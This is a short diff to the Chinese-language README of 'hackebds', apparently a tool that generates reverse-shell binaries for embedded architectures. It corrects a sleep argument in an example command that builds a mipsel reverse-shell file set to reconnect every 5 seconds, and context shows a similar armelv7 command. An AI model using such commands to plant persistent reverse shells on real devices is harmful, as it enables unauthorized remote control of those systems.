@@ -108,7 +108,7 @@ hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_she
 ​	如果需要每5秒创建一次反向shell
 
 ```
-hackebds -reverse_ip 127.0.0.1 -reverse_port 9999 -arch mipsel -res reverse_shell_file -power -sleep -5
+hackebds -reverse_ip 127.0.0.1 -reverse_port 9999 -arch mipsel -res reverse_shell_file -power -sleep 5
 ```
 
 ![image-20221102183017775](https://img-blog.csdnimg.cn/img_convert/660574b30d7ae810cc7b0d96a3a60bd2.png)
